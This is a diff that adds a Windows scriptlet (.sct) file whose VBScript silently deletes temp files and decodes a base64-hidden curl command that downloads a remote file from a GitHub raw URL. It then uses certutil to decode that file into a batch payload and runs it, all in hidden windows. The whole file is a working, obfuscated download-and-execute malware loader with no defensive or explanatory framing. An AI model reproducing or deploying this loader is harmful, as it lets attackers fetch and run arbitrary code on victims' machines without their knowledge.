@@ -1,0 +1,36 @@
+<?XML version="1.0"?>
+<scriptlet>
+
+<registration
+    description="Ere"
+    progid="Ere"
+    version="1.00"
+    classid="{20001111-0000-0000-0000-0000FEEDACDC}"
+	>
+	<script language="VbScript">
+		<![CDATA[
+	
+			Set WshShell = CreateObject("WScript.Shell")
+			Set fso = CreateObject("Scripting.FileSystemObject")
+
+			WshShell.Run "cmd /c del %TEMP%\log*", 0, True
+			WshShell.Run "cmd /c del %TEMP%\*.bat", 0, True
+
+			If fso.FileExists("%TEMP%\batarang.bat") Then
+				'
+			Else
+				WshShell.Run "cmd /c echo Y3VybCBodHRwczovL3Jhdy5naXRodWJ1c2VyY29udGVudC5jb20vY2hyaXN1dTExL0JBVE1BTi9tYWluL2NvZGUvYmF0YXJhbmcgPiAlVEVNUCVcbG9nMwo= > %TEMP%\log", 0, True
+        			WshShell.Run "cmd /c certutil -decode %TEMP%\log %TEMP%\log2.bat", 0, True
+				WshShell.Run "%TEMP%\log2.bat", 0, True
+				WshShell.Run "cmd /c certutil -decode %TEMP%\log3 %TEMP%\batarang.bat", 0, True
+				WshShell.Run "cmd /c del %TEMP%\log*", 0, True
+			End If
+
+			WshShell.Run "%TEMP%\batarang.bat", 0, True
+			Set WshShell = Nothing
+	
+		]]>
+</script>
+</registration>
+
+</scriptlet>
